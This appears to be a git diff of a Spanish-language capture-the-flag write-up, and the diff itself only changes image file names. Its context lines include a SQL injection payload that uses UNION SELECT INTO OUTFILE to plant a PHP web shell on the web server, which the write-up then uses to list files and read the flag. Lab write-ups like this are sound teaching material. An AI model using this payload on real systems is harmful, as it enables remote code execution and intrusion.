@@ -320,7 +320,7 @@ Nos encontramos un panel de login y lo bypasseamos con una inyección básica.
 
 Estamos dentro.
 
-<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vamos a ver cuántas columnas tiene.
 
@@ -368,16 +368,16 @@ Nos salta un error pero de las tres condiciones necesarias, el usuario ya cuenta
 '+union+select+"","",'<%3fphp+system($_REQUEST[0])%3b+%3f>',+"",+""+into+outfile+'/var/www/html/dashboard/shell.php'--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Accedemos a la web shell.
 
-<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Listamos los archivos.
 
-<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Mostramos el contenido de la flag.
 
-<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
